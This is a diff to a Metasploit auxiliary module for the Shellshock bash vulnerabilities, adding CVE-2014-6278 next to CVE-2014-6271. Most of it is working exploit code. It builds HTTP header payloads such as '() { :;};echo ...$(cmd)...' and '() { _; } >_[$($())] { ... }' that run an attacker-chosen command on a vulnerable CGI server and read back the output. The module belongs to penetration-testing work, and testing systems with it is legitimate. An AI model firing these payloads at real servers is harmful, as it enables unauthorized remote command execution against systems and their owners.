@@ -29,10 +29,12 @@ class Metasploit4 < Msf::Auxiliary
       },
       'Author' => [
         'Stephane Chazelas', # Vulnerability discovery
-        'wvu' # Metasploit module
+        'wvu', # Metasploit module
+        'lcamtuf' # CVE-2014-6278
       ],
       'References' => [
         ['CVE', '2014-6271'],
+        ['CVE', '2014-6278'],
         ['OSVDB', '112004'],
         ['EDB', '34765'],
         ['URL', 'https://access.redhat.com/articles/1200223'],
@@ -47,12 +49,14 @@ class Metasploit4 < Msf::Auxiliary
       OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
       OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
       OptString.new('CMD', [true, 'Command to run (absolute paths required)',
-        '/usr/bin/id'])
+        '/usr/bin/id']),
+      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271',
+        ['CVE-2014-6271', 'CVE-2014-6278']])
     ], self.class)
   end
 
   def check_host(ip)
-    res = req("echo #{marker}")
+    res = req("echo #{marker}", datastore['CVE'])
 
     if res && res.body.include?(marker * 3)
       report_vuln(
@@ -85,7 +89,7 @@ class Metasploit4 < Msf::Auxiliary
   def run_host(ip)
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
-    res = req(datastore['CMD'])
+    res = req(datastore['CMD'], datastore['CVE'])
 
     if res && res.body =~ /#{marker}(.+)#{marker}/m
       print_good("#{peer} - #{$1}")
@@ -98,18 +102,29 @@ class Metasploit4 < Msf::Auxiliary
     end
   end
 
-  def req(cmd)
+  def req(cmd, cve)
+    case cve
+    when 'CVE-2014-6271'
+      sploit = cve_2014_6271(cmd)
+    when 'CVE-2014-6278'
+      sploit = cve_2014_6278(cmd)
+    end
+
     send_request_cgi(
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
       'headers' => {
-        datastore['HEADER'] => sploit(cmd)
+        datastore['HEADER'] => sploit
       }
     )
   end
 
-  def sploit(cmd)
+  def cve_2014_6271(cmd)
     %Q{() { :;};echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"}
+  end
+
+  def cve_2014_6278(cmd)
+    %Q{() { _; } >_[$($())] { echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"; }}
   end
 
   def marker
